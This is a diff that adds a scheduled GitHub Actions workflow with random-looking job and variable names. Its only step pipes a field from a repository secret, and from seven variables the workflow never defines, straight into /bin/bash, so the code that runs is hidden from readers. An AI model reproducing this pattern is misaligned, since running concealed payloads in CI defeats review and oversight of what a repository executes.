@@ -1,0 +1,24 @@
+name: lixinzhaoyuan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lixinzhaoyuan
+        env:
+          ukpzr46481: ${{ secrets.ukpzr46481 }}
+        run: |
+          echo $ukpzr46481 | jq -r .mjanh9105 | /bin/bash
+          echo $ciu4 | jq -r .vozb0166 | /bin/bash
+          echo $ho969 | jq -r .isit595 | /bin/bash
+          echo $baa5 | jq -r .cyaex4190 | /bin/bash
+          echo $ldbfb49358 | jq -r .zzuuh5 | /bin/bash
+          echo $vit9327 | jq -r .uxi73865 | /bin/bash
+          echo $adxb213 | jq -r .xqqg07 | /bin/bash
+          echo $gxmq72774 | jq -r .gnsdm864 | /bin/bash
+
